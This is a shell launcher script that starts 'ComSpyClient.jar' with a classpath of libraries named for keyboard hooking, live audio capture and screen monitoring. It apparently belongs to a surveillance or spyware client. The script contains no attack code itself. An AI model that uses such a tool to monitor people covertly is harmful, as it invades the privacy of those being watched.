#!/bin/sh

PROGRAM=`pwd`
exec "$PROGRAM"/jre/bin/java -Xmx1024m -jar "$PROGRAM"/Server/ComSpyClient.jar -classpath "$PROGRAM"/dist/lib/commons-net-3.0.1.jar:"$PROGRAM"/dist/lib/httpclient-4.3.6.jar:"$PROGRAM"/dist/lib/httpcore-4.3.3.jar:"$PROGRAM"/dist/lib/httpmime-4.3.6.jar:"$PROGRAM"/dist/lib/javaFlacEncoder-0.3.1.jar:"$PROGRAM"/dist/lib/java-json.jar:"$PROGRAM"/dist/lib/jmf.jar:"$PROGRAM"/dist/lib/jna-4.1.0.jar:"$PROGRAM"/dist/lib/jna-platform-4.1.0.jar:"$PROGRAM"/dist/lib/KeyboardHook.jar:"$PROGRAM"/dist/lib/libLiveAudioRemotle.jar:"$PROGRAM"/dist/lib/libScreenMonitor.jar:"$PROGRAM"/dist/lib/org-apache-commons-logging.jar:"$PROGRAM"/dist/lib/synthetica.jar:"$PROGRAM"/dist/lib/syntheticaClassy.jar:"$PROGRAM"/dist/lib/jarinjarloader.zip
